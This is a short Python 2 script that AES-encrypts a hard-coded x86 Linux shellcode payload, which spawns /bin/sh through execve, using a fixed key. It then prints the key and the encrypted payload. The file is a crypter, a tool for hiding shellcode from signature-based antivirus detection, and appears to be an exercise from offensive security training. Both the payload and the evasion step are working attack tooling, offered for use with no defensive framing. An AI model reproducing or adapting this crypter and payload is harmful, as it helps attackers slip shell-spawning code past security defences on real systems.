#!/usr/bin/python
# Author: Eric Van Zutphen
# Filename: encrypter.py
from Crypto.Cipher import AES
import base64, os

def encrypter(shellcode):
    BLOCK_SIZE = 16
    PADDING = '{'
    pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
    encodeaes = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
    secret = 'TMzvovqyJ0QXkjSS1XXwHg=='
    print 'Secret: ' + secret
    cipher = AES.new(secret)
    encoded = encodeaes(cipher, shellcode)
    print'Encrypted Shellcode: ' + encoded

encrypter("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")